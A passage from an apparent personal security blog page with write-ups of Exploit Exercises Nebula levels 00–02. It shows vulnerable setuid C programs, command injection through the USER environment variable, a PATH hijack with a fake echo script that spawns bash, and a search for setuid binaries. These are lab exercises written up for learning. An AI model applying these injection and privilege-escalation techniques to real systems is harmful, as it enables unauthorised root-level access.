+    gid <span style="color: #339933;">=</span> getegid<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    uid <span style="color: #339933;">=</span> geteuid<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+    setresgid<span style="color: #009900;">&#40;</span>gid<span style="color: #339933;">,</span> gid<span style="color: #339933;">,</span> gid<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    setresuid<span style="color: #009900;">&#40;</span>uid<span style="color: #339933;">,</span> uid<span style="color: #339933;">,</span> uid<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+    buffer <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span>
+&nbsp;
+    asprintf<span style="color: #009900;">&#40;</span><span style="color: #339933;">&amp;</span>buffer<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;/bin/echo %s is cool&quot;</span><span style="color: #339933;">,</span> <span style="color: #000066;">getenv</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;USER&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #000066;">printf</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;about to call system(<span style="color: #000099; font-weight: bold;">\&quot;</span>%s<span style="color: #000099; font-weight: bold;">\&quot;</span>)<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> buffer<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+    <span style="color: #000066;">system</span><span style="color: #009900;">&#40;</span>buffer<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span></pre></td>
+</tr></table>
+<p class="theCode" style="display:none;">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char **argv, char **envp)
+{
+    char *buffer;
+
+    gid_t gid;
+    uid_t uid;
+
+    gid = getegid();
+    uid = geteuid();
+
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
+
+    buffer = NULL;
+
+    asprintf(&amp;buffer, &quot;/bin/echo %s is cool&quot;, getenv(&quot;USER&quot;));
+    printf(&quot;about to call system(\&quot;%s\&quot;)\n&quot;, buffer);
+
+    system(buffer);
+}</p>
+</div>
+
+<p>This is similar to the Level 01. An environment variable $USER is being used to construct a string that is printed to the screen before being run. If we can edit that environment variable, we can inject a malicious command.</p>
+<p>Initially I changed $USER so that running the program would execute getflag. The command I used was:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #007800;">USER</span>=;getflag;<span style="color: #7a0874; font-weight: bold;">echo</span></pre></td></tr></table>
+<p class="theCode" style="display:none;">USER=;getflag;echo</p>
+</div>
+
+<p>I&#8217;ll break this down:<br>
+<strong>;</strong> &#8211; end the command and start a new one<br>
+<strong>getflag</strong> &#8211; run the getflag program<br>
+<strong>;</strong> &#8211; end the command and start a new one<br>
+<strong>echo</strong> &#8211; start a new echo command so that the following arguments don&#8217;t cause an error</p>
+<p>This results in the following command being run:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #000000; font-weight: bold;">/</span>bin<span style="color: #000000; font-weight: bold;">/</span><span style="color: #7a0874; font-weight: bold;">echo</span> ;getflag;<span style="color: #7a0874; font-weight: bold;">echo</span> is cool</pre></td></tr></table>
+<p class="theCode" style="display:none;">/bin/echo ;getflag;echo is cool</p>
+</div>
+
+<p>I got a success message from get flag, but I wanted shell, so I changed my command to:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #007800;">USER</span>=<span style="color: #ff0000;">&quot;Opening escalated shell...;bin/bash;echo Closing pwned shell, now that&quot;</span></pre></td></tr></table>
+<p class="theCode" style="display:none;">USER=&quot;Opening escalated shell...;bin/bash;echo Closing pwned shell, now that&quot;</p>
+</div>
+
+<p>This time I got shell, and some cool text when going into the shell and when coming out (after typing exit)</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/exploit-excercises/" rel="category tag">Exploit Excercises</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/exploit-exercises-nebula-level-02/#comments"><b>3</b> Replies</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-165 -->
+
+				
+					
+	<article id="post-149" class="post-149 post type-post status-publish format-standard hentry category-exploit category-exploit-excercises category-infosec category-linux category-pentest category-shell category-unix">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/exploit-exercises-nebula-level-01/" rel="bookmark">Exploit Exercises – Nebula – Level 01</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/exploit-exercises-nebula-level-01/" title="3:01 PM" rel="bookmark"><time class="entry-date" datetime="2012-11-28T15:01:30+00:00">2012-11-28</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/exploit-exercises-nebula-level-01/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Following on from <a title="grobinson.me: Exploit Excercises - Nebula - Level 00" href="/exploit-exercises-nebula-level-00/" target="_blank">my previous post</a> this one is about <a title="Level 01" href="http://exploit-exercises.com/nebula/level01" target="_blank">le</a><a title="Nebula - Level 01" href="http://exploit-exercises.com/nebula/level01" target="_blank">vel01 of Nebula</a> on <a title="Exploit Exercises" href="http://exploit-exercises.com/" target="_blank">exploit-excercises.com</a>. The information about this level says:</p>
+<p style="padding-left: 30px;">There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?<br>
+To do this level, log in as the level01 account with the password level01 . Files for this level can be found in /home/flag01.</p>
+<p>It also contains some source code:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr>
+<td class="line_numbers"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td>
+<td class="code"><pre class="c" style="font-family:monospace;"><span style="color: #339933;">#include &lt;stdlib.h&gt;</span>
+<span style="color: #339933;">#include &lt;unistd.h&gt;</span>
+<span style="color: #339933;">#include &lt;string.h&gt;</span>
+<span style="color: #339933;">#include &lt;sys/types.h&gt;</span>
+<span style="color: #339933;">#include &lt;stdio.h&gt;</span>
+&nbsp;
+<span style="color: #993333;">int</span> main<span style="color: #009900;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>argv<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>envp<span style="color: #009900;">&#41;</span>
+<span style="color: #009900;">&#123;</span>
+    gid_t gid<span style="color: #339933;">;</span>
+    uid_t uid<span style="color: #339933;">;</span>
+    gid <span style="color: #339933;">=</span> getegid<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    uid <span style="color: #339933;">=</span> geteuid<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+    setresgid<span style="color: #009900;">&#40;</span>gid<span style="color: #339933;">,</span> gid<span style="color: #339933;">,</span> gid<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    setresuid<span style="color: #009900;">&#40;</span>uid<span style="color: #339933;">,</span> uid<span style="color: #339933;">,</span> uid<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+    <span style="color: #000066;">system</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;/usr/bin/env echo and now what?&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span></pre></td>
+</tr></table>
+<p class="theCode" style="display:none;">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char **argv, char **envp)
+{
+    gid_t gid;
+    uid_t uid;
+    gid = getegid();
+    uid = geteuid();
+
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
+
+    system(&quot;/usr/bin/env echo and now what?&quot;);
+}</p>
+</div>
+
+<p>I&#8217;m not all that familiar with C (I&#8217;m more of a scripter), but I can understand enough; this appears to basically sets all uids for the process to the effective uid (presumably the setuid bit is present) and then calls a command line of:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #000000; font-weight: bold;">/</span>usr<span style="color: #000000; font-weight: bold;">/</span>bin<span style="color: #000000; font-weight: bold;">/</span><span style="color: #c20cb9; font-weight: bold;">env</span> <span style="color: #7a0874; font-weight: bold;">echo</span> and now what?</pre></td></tr></table>
+<p class="theCode" style="display:none;">/usr/bin/env echo and now what?</p>
+</div>
+
+<p>I wasn&#8217;t familiar with the env command so used a bit of googling until I learned that env is used to launch programs in a different environment. It also also sometimes used because a script needs to start with a shebang and followed by an interpreter directive, which must be an absolute path. Because some interpreters are not always installed at the same location, env is sometimes used to launch the correct interpreter by file name rather than full path (e.g. <strong>#!/usr/bin/env/ python</strong>). To do this, env searches through the list of paths in in the environment variable $PATH in order until it finds a correctly named file that it can execute in one of them. Presumably (for some unknown reason) env is being used here to invoke echo, but it means we can make a different echo program run by creating a malicious script and changing $PATH to point to it first.</p>
+<p>I changed the path to include /tmp at the beginning by running the follwing command:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #007800;">PATH</span>=<span style="color: #000000; font-weight: bold;">/</span>tmp:<span style="color: #007800;">$PATH</span></pre></td></tr></table>
+<p class="theCode" style="display:none;">PATH=/tmp:$PATH</p>
+</div>
+
+<p>and then created a new symbolic link called echo to the getflag program:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">ln</span> <span style="color: #660033;">-s</span> <span style="color: #000000; font-weight: bold;">/</span>bin<span style="color: #000000; font-weight: bold;">/</span>getflag <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span><span style="color: #7a0874; font-weight: bold;">echo</span></pre></td></tr></table>
+<p class="theCode" style="display:none;">ln -s /bin/getflag /tmp/echo</p>
+</div>
+
+<p>Now when I ran the vulnerable program I got a success message, but I wanted to go one further. I wanted shell&#8230;</p>
+<p>I tried creating a symbolic link to bash, but now running flag01 failed due to the invalid arguments (&#8220;and now what?&#8221; are valid arguments for echo, but not bash), so I removed the symbolic link and created an executable shell script that ignored all arguments, and saved it as echo in /tmp. It contained the following two lines of code:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr>
+<td class="line_numbers"><pre>1
+2
+</pre></td>
+<td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #666666; font-style: italic;">#!/bin/bash</span>
+<span style="color: #000000; font-weight: bold;">/</span>bin<span style="color: #000000; font-weight: bold;">/</span><span style="color: #c20cb9; font-weight: bold;">bash</span></pre></td>
+</tr></table>
+<p class="theCode" style="display:none;">#!/bin/bash
+/bin/bash</p>
+</div>
+
+<p>This, I hoped, would cause the vulnerable program to spawn a shell. I tested it and it worked. I then ran <strong>whoami</strong> to confirm that I was flag01 and then <strong>getflag</strong> to get a success message.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/exploit-excercises/" rel="category tag">Exploit Excercises</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/exploit-exercises-nebula-level-01/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-149 -->
+
+				
+					
+	<article id="post-143" class="post-143 post type-post status-publish format-standard hentry category-exploit category-exploit-excercises category-infosec category-linux category-pentest category-shell category-unix">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/exploit-exercises-nebula-level-00/" rel="bookmark">Exploit Exercises &#8211; Nebula &#8211; Level 00</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/exploit-exercises-nebula-level-00/" title="1:42 PM" rel="bookmark"><time class="entry-date" datetime="2012-11-28T13:42:15+00:00">2012-11-28</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/exploit-exercises-nebula-level-00/#comments">1</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>I&#8217;ve started to have a look at the challenges offered by <a title="Exploit Exercises" href="http://exploit-exercises.com/" target="_blank">exploit-exercises.com</a> and thought I&#8217;d document my progress.</p>
+<p>This post is about <a title="Nebula Level 00" href="http://exploit-exercises.com/nebula/level00" target="_blank">Nebula Level 00</a>. The information about this level says:</p>
+<p style="padding-left: 30px;">This level requires you to find a Set User ID program that will run as the &#8220;flag00&#8221; account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.<br>
+Alternatively, look at the find man page.<br>
+To access this level, log in as level00 with the password of level00 .</p>
+<p>This is a pretty simple challenge, but did mean I had to learn all about normal unix filesystem permissions and the more advanced setuid/setguid/stickybit permissions I also learned how to suppress errors from the find command and how to better use the find and man command.</p>
+<p>The command I used was</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="c" style="font-family:monospace;">find <span style="color: #339933;">/</span> <span style="color: #339933;">-</span>perm <span style="color: #339933;">-</span>u<span style="color: #339933;">=</span>s <span style="color: #0000dd;">2</span><span style="color: #339933;">&gt;/</span>dev<span style="color: #339933;">/</span><span style="color: #000000; font-weight: bold;">null</span></pre></td></tr></table>
+<p class="theCode" style="display:none;">find / -perm -u=s 2&gt;/dev/null</p>
+</div>
+
+<p>I&#8217;ll break down what this does:</p>
+<ul>
+<li>
+<strong>find</strong> &#8211; search for files in a directory hierarchy</li>
+<li>
+<strong>/</strong> &#8211; start at the root of the filesystem</li>
+<li>
+<strong>-perm -u=s</strong> &#8211; find files that have the setuid bit set in their permissions</li>
+<li>
+<strong>2&gt;/dev/null</strong> &#8211; discard all errors (mostly about not having permission to scan directories)</li>
+</ul>
+<p>One of the results was <strong>/bin/&#8230;/flag00</strong>. This (<strong>&#8230;\</strong>) is a suspicious looking directory! Running <strong>ll /bin/&#8230;/flag00</strong> showed me that the owner was flag00 and the setuid bit was indeed set so I ran the file which told me to now run getflag then changed the user to flag00. Running <strong>getflag</strong> gave me a success message.</p>
+<p>What I liked about this was that I had a shell running as the flag00 user so I could run other commands like <strong>whoami</strong> before typing <strong>exit</strong> to get out of the shell. At the time, I had no idea how I was put into a new shell, but it all becomes clearer in the next level&#8230;</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/exploit-excercises/" rel="category tag">Exploit Excercises</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/exploit-exercises-nebula-level-00/#comments"><b>1</b> Reply</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-143 -->
+
+				
+				
+			
+			</div>
+<!-- #content -->
+		</section><!-- #primary -->
+
+		<div id="secondary" class="widget-area" role="complementary">
+			<aside id="rss-2" class="widget widget_rss"><h3 class="widget-title">
+<a class="rsswidget rss-widget-feed" href="/?feed=rss"><img class="rss-widget-icon" style="border:0" width="14" height="14" src="/wp-includes/images/rss.png" alt="RSS" loading="lazy"></a> <a class="rsswidget rss-widget-title" href="/">grobinson.me RSS feed</a>
+</h3>
+<ul><li><a class="rsswidget" href="/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a></li></ul></aside><aside id="search-2" class="widget widget_search">	<form method="get" id="searchform" action="/">
+		<label for="s" class="assistive-text">Search</label>
+		<input type="text" class="field" name="s" id="s" placeholder="Search">
+		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search">
+	</form>
+</aside>
+		<aside id="recent-posts-2" class="widget widget_recent_entries">
+		<h3 class="widget-title">Recent Posts</h3>
+		<ul>
+											<li>
+					<a href="/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a>
+									</li>
+											<li>
+					<a href="/reverse-shells-even-without-nc-on-linux/">Reverse shells even without nc on Linux</a>
+									</li>
+											<li>
+					<a href="/i-discovered-a-vulnerability-in-a-wordpress-plugin/">I discovered a vulnerability in a wordpress plugin</a>
+									</li>
+											<li>
+					<a href="/i-passed-oscp/">I passed OSCP!</a>
+									</li>
+											<li>
+					<a href="/fristileaks-1-3/">FristiLeaks 1.3</a>
+									</li>
+					</ul>
+
+		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3>
+<ul id="recentcomments">
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/" class="url" rel="ugc">Graeme Robinson</a></span> on <a href="/single-line-php-script-to-gain-shell/#comment-5077679">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link">Daniel</span> on <a href="/single-line-php-script-to-gain-shell/#comment-5061347">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="https://www.instagram.com/endego.dj/" class="url" rel="ugc external nofollow">Errorgedill</a></span> on <a href="/learning-more-about-buffer-overflow-exploits/#comment-5021162">Learning more about buffer overflow exploits</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/reverse-shells-even-without-nc-on-linux/" class="url" rel="ugc">Reverse shells even without nc on Linux | Graeme Robinson&#039;s blog</a></span> on <a href="/single-line-php-script-to-gain-shell/#comment-4568725">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/i-passed-oscp/" class="url" rel="ugc">I passed OSCP! | Graeme Robinson&#039;s blog</a></span> on <a href="/ive-signed-up-to-the-penetration-testing-with-kali-linux-course-oscp/#comment-4568721">I&#8217;ve signed up to the Penetration testing with Kali Linux Course (OSCP)</a>
+</li>
+</ul></aside><aside id="archives-2" class="widget widget_archive"><h3 class="widget-title">Archives</h3>
+			<ul>
+					<li><a href="/2018/07/">July 2018</a></li>
+	<li><a href="/2018/04/">April 2018</a></li>
+	<li><a href="/2017/10/">October 2017</a></li>
+	<li><a href="/2017/08/">August 2017</a></li>
+	<li><a href="/2017/06/">June 2017</a></li>
+	<li><a href="/2016/08/">August 2016</a></li>
+	<li><a href="/2014/11/">November 2014</a></li>
+	<li><a href="/2013/01/">January 2013</a></li>
+	<li><a href="/2012/12/">December 2012</a></li>
+	<li><a href="/2012/11/">November 2012</a></li>
+	<li><a href="/2012/10/">October 2012</a></li>
+	<li><a href="/2012/09/">September 2012</a></li>
+	<li><a href="/2012/08/">August 2012</a></li>
+			</ul>
+
+			</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>
+			<ul>
+					<li class="cat-item cat-item-47">
+<a href="/category/ios/jailbreak/appsync/">AppSync</a>
+</li>
+	<li class="cat-item cat-item-16">
+<a href="/category/infosec/hash/crack/brute-force/">Brute Force</a>
+</li>
+	<li class="cat-item cat-item-62">
+<a href="/category/exploit/exploit-development/buffer-overflow/">Buffer Overflow</a>
+</li>
+	<li class="cat-item cat-item-55">
+<a href="/category/career/">Career</a>
+</li>
+	<li class="cat-item cat-item-20">
+<a href="/category/comic/">Comic</a>
+</li>
+	<li class="cat-item cat-item-35">
+<a href="/category/infosec/compromise/">Compromise</a>
+</li>
+	<li class="cat-item cat-item-52">
+<a href="/category/infosec/conference/">Conference</a>
+</li>
+	<li class="cat-item cat-item-13">
+<a href="/category/infosec/hash/crack/">Crack</a>
+</li>
+	<li class="cat-item cat-item-48">
+<a href="/category/development/">Development</a>
+</li>
+	<li class="cat-item cat-item-41">
+<a href="/category/education/">Education</a>
+</li>
+	<li class="cat-item cat-item-27">
+<a href="/category/email/">Email</a>
+</li>
+	<li class="cat-item cat-item-5">
+<a href="/category/infosec/encryption/">Encryption</a>
+</li>
+	<li class="cat-item cat-item-30">
+<a href="/category/exploit/">Exploit</a>
+</li>
+	<li class="cat-item cat-item-40">
+<a href="/category/exploit-excercises/">Exploit Excercises</a>
+</li>
+	<li class="cat-item cat-item-58">
+<a href="/category/exploit/exploit-db/">exploit-db</a>
+</li>
+	<li class="cat-item cat-item-21">
+<a href="/category/os-x/filevault/">FileVault</a>
+</li>
+	<li class="cat-item cat-item-24">
+<a href="/category/infosec/encryption/full-disk-encryption/">Full Disk Encryption</a>
+</li>
+	<li class="cat-item cat-item-36">
+<a href="/category/passwords/google-authenticator/">Google Authenticator</a>
+</li>
+	<li class="cat-item cat-item-9">
+<a href="/category/infosec/hash/">Hash</a>
+</li>
+	<li class="cat-item cat-item-14">
+<a href="/category/infosec/hash/crack/hashcat/">HashCat</a>
+</li>
+	<li class="cat-item cat-item-25">
+<a href="/category/email/hotmail/">Hotmail</a>
+</li>
+	<li class="cat-item cat-item-61">
+<a href="/category/exploit/exploit-development/immunity/">Immunity</a>
+</li>
+	<li class="cat-item cat-item-4">
+<a href="/category/infosec/">Information Security</a>
+</li>
+	<li class="cat-item cat-item-45">
+<a href="/category/ios/">iOS</a>
+</li>
+	<li class="cat-item cat-item-46">
+<a href="/category/ios/jailbreak/">JailBreak</a>
+</li>
+	<li class="cat-item cat-item-8">
+<a href="/category/infosec/hash/crack/john-the-ripper/">John The Ripper</a>
+</li>
+	<li class="cat-item cat-item-57">
+<a href="/category/kali/">Kali</a>
+</li>
+	<li class="cat-item cat-item-33">
+<a href="/category/passwords/lastpass/">LastPass</a>
+</li>
+	<li class="cat-item cat-item-37">
+<a href="/category/lesson-learned/">Lesson Learned</a>
+</li>
+	<li class="cat-item cat-item-39 current-cat">
+<a aria-current="page" href="/category/unix/linux/">Linux</a>
+</li>
+	<li class="cat-item cat-item-60">
+<a href="/category/exploit/exploit-development/mona-py/">mona.py</a>
+</li>
+	<li class="cat-item cat-item-42">
+<a href="/category/education/online-course/">Online Course</a>
+</li>
+	<li class="cat-item cat-item-23">
+<a href="/category/os-x/">OS X</a>
+</li>
+	<li class="cat-item cat-item-53">
+<a href="/category/education/online-course/oscp/">OSCP</a>
+</li>
+	<li class="cat-item cat-item-19">
+<a href="/category/passwords/password-complexity/">Password Complexity</a>
+</li>
+	<li class="cat-item cat-item-32">
+<a href="/category/passwords/password-reuse/">Password Reuse</a>
+</li>
+	<li class="cat-item cat-item-18">
+<a href="/category/passwords/">Passwords</a>
+</li>
+	<li class="cat-item cat-item-7">
+<a href="/category/infosec/pentest/">Penetration Test</a>
+</li>
+	<li class="cat-item cat-item-29">
+<a href="/category/php/">PHP</a>
+</li>
+	<li class="cat-item cat-item-44">
+<a href="/category/passwords/plaintext/">Plaintext</a>
+</li>
+	<li class="cat-item cat-item-56">
+<a href="/category/pwk/">PWK</a>
+</li>
+	<li class="cat-item cat-item-54">
+<a href="/category/development/python/">Python</a>
+</li>
+	<li class="cat-item cat-item-15">
+<a href="/category/infosec/hash/salt/">Salt</a>
+</li>
+	<li class="cat-item cat-item-28">
+<a href="/category/shell/">Shell</a>
+</li>
+	<li class="cat-item cat-item-43">
+<a href="/category/education/online-course/stanford-online/">Stanford Online</a>
+</li>
+	<li class="cat-item cat-item-1">
+<a href="/category/uncategorized/">Uncategorized</a>
+</li>
+	<li class="cat-item cat-item-38 current-cat-parent current-cat-ancestor">
+<a href="/category/unix/">Unix</a>
+</li>
+	<li class="cat-item cat-item-31">
+<a href="/category/web-server/">Web Server</a>
+</li>
+	<li class="cat-item cat-item-6">
+<a href="/category/infosec/webapp/">WebApp</a>
+</li>
+	<li class="cat-item cat-item-51">
+<a href="/category/infosec/white-hat/">White Hat</a>
+</li>
+	<li class="cat-item cat-item-34">
+<a href="/category/infosec/webapp/windows-live/">Windows Live</a>
+</li>
+	<li class="cat-item cat-item-49">
+<a href="/category/development/xcode/">XCode</a>
+</li>
+	<li class="cat-item cat-item-26">
+<a href="/category/comic/xkcd/">XKCD</a>
+</li>
+			</ul>
+
+			</aside>		</div>
+<!-- #secondary .widget-area -->
+
+	</div>
+<!-- #main -->
+
+	<footer id="colophon">
+
+			
+
+			<div id="site-generator">
+												<a href="https://wordpress.org/" class="imprint" title="Semantic Personal Publishing Platform">
+					Proudly powered by WordPress				</a>
+			</div>
+	</footer><!-- #colophon -->
+</div>
+<!-- #page -->
+
+<script type="text/javascript" src="/wp-content/plugins/wp-syntax/js/wp-syntax.js?ver=1.2" id="wp-syntax-js-js"></script>
+
+</body>
+</html>
